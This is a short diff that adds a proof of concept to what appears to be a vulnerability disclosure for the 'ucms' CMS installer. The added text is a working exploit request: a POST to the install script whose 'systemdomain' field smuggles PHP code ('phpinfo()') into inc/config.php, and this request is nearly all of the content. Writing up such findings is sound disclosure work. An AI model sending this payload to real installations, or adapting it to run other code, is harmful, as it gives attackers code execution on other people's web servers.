@@ -20,6 +20,10 @@ and write to inc/config.php
 
 poc:
 
+POST /install/index.php?step=2
+
+database=mysqlpdo&mysql_host=127.0.0.1&mysql_dbname=ucms&mysql_user=root&mysql_password=root&sqlite_dbfile=c66a432720a73177.db&tableex=ucms_&systemdomain=1');phpinfo();//&urlrewrite=0&uuuadminname=admin&uuuadminpassword=admin&uuuadminpassword2=admin
+
 ![](https://github.com/imkitsch/CVE/blob/main/ucms/20211127172003.png)
 
 Injection php code to inc/config.php
